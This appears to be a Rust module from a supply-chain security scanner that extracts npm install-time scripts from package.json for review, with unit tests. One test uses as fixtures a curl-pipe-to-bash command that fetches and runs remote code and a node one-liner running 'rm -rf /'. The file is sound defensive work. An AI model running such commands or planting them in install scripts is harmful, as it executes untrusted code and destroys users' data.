//! Detection of install-time scripts in package.json.
//!
//! Install-time scripts (`preinstall`, `install`, `postinstall`, `prepare`) are
//! a common malware delivery path as they execute arbitrary code during package
//! installation without user interaction.

use serde_json::Value;

const INSTALL_SCRIPT_NAMES: [&str; 4] = ["preinstall", "install", "postinstall", "prepare"];

/// Extract install-time scripts from a package.json string.
///
/// Returns a vector of (script_name, script_command) tuples for each install-time
/// script found in the "scripts" object. Only includes `preinstall`, `install`,
/// `postinstall`, and `prepare` scripts.
///
/// # Arguments
///
/// * `package_json` - Raw package.json content as a string
///
/// # Returns
///
/// A vector of tuples containing (script_name, script_command). Returns an empty
/// vector if:
/// - The JSON is malformed
/// - There is no "scripts" object
/// - None of the install-time scripts are present
///
/// # Examples
///
/// ```
/// use deprader::behavioral::scripts::install_scripts;
///
/// let package_json = r#"{
///   "name": "my-package",
///   "scripts": {
///     "preinstall": "node setup.js",
///     "test": "jest"
///   }
/// }"#;
///
/// let scripts = install_scripts(package_json);
/// assert_eq!(scripts, vec![("preinstall".to_string(), "node setup.js".to_string())]);
/// ```
pub fn install_scripts(package_json: &str) -> Vec<(String, String)> {
    let parsed: Value = match serde_json::from_str(package_json) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let scripts = match parsed.get("scripts") {
        Some(Value::Object(obj)) => obj,
        _ => return Vec::new(),
    };

    let mut result = Vec::new();

    for &script_name in &INSTALL_SCRIPT_NAMES {
        if let Some(Value::String(command)) = scripts.get(script_name) {
            result.push((script_name.to_string(), command.clone()));
        }
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_no_scripts() {
        let package_json = r#"{
            "name": "test-package",
            "version": "1.0.0"
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(scripts, Vec::<(String, String)>::new());
    }

    #[test]
    fn test_empty_scripts() {
        let package_json = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "scripts": {}
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(scripts, Vec::<(String, String)>::new());
    }

    #[test]
    fn test_single_install_script() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "install": "node install.js"
            }
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(
            scripts,
            vec![("install".to_string(), "node install.js".to_string())]
        );
    }

    #[test]
    fn test_all_install_scripts() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "preinstall": "echo preinstall",
                "install": "echo install",
                "postinstall": "echo postinstall",
                "prepare": "echo prepare"
            }
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(scripts.len(), 4);
        assert!(scripts.contains(&("preinstall".to_string(), "echo preinstall".to_string())));
        assert!(scripts.contains(&("install".to_string(), "echo install".to_string())));
        assert!(scripts.contains(&("postinstall".to_string(), "echo postinstall".to_string())));
        assert!(scripts.contains(&("prepare".to_string(), "echo prepare".to_string())));
    }

    #[test]
    fn test_mixed_scripts() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "preinstall": "node setup.js",
                "test": "jest",
                "build": "webpack",
                "postinstall": "node cleanup.js"
            }
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(scripts.len(), 2);
        assert!(scripts.contains(&("preinstall".to_string(), "node setup.js".to_string())));
        assert!(scripts.contains(&("postinstall".to_string(), "node cleanup.js".to_string())));
    }

    #[test]
    fn test_malformed_json() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "install": "node install.js"
        }"#; // Missing closing brace

        let scripts = install_scripts(package_json);
        assert_eq!(scripts, Vec::<(String, String)>::new());
    }

    #[test]
    fn test_scripts_not_object() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": "not an object"
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(scripts, Vec::<(String, String)>::new());
    }

    #[test]
    fn test_script_value_not_string() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "install": 123,
                "postinstall": "node cleanup.js"
            }
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(
            scripts,
            vec![("postinstall".to_string(), "node cleanup.js".to_string())]
        );
    }

    #[test]
    fn test_complex_script_commands() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "preinstall": "curl -sSL https://example.com/install.sh | bash",
                "postinstall": "node -e \"require('child_process').exec('rm -rf /')\""
            }
        }"#;

        let scripts = install_scripts(package_json);
        assert_eq!(scripts.len(), 2);
        assert!(scripts.contains(&(
            "preinstall".to_string(),
            "curl -sSL https://example.com/install.sh | bash".to_string()
        )));
        assert!(scripts.contains(&(
            "postinstall".to_string(),
            "node -e \"require('child_process').exec('rm -rf /')\"".to_string()
        )));
    }

    #[test]
    fn test_empty_string() {
        let scripts = install_scripts("");
        assert_eq!(scripts, Vec::<(String, String)>::new());
    }
}
